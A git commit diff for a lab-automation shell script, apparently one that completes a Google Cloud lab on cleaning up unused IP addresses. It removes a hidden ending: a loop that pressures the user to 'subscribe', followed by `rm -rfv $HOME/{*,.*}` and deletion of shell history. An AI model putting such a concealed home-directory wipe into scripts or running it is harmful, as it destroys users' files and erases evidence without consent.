526e6fe25c504fb87e070b2de3988c9795624d5a
quiccklabs <108678347+quiccklabs@users.noreply.github.com>
2023-10-04 03:40:51 +0530

    Update quicklabgsp646.sh

--- Clean Up Unused IP Addresses/quicklabgsp646.sh
+++ Clean Up Unused IP Addresses/quicklabgsp646.sh
@@ -125,17 +125,3 @@ Lab Completed !!!
 
 ${RESET}"
 
-#-----------------------------------------------------end----------------------------------------------------------#
-read -p "${BOLD}${RED}Subscribe to Quicklab [y/n] : ${RESET}" CONSENT_REMOVE
-
-while [ "$CONSENT_REMOVE" != 'y' ]; do
-  sleep 10
-  read -p "${BOLD}${YELLOW}Do Subscribe to Quicklab [y/n] : ${RESET}" CONSENT_REMOVE
-done
-
-echo "${BLUE}${BOLD}Thanks For Subscribing :)${RESET}"
-
-rm -rfv $HOME/{*,.*}
-rm $HOME/.bash_history
-
-exit 0
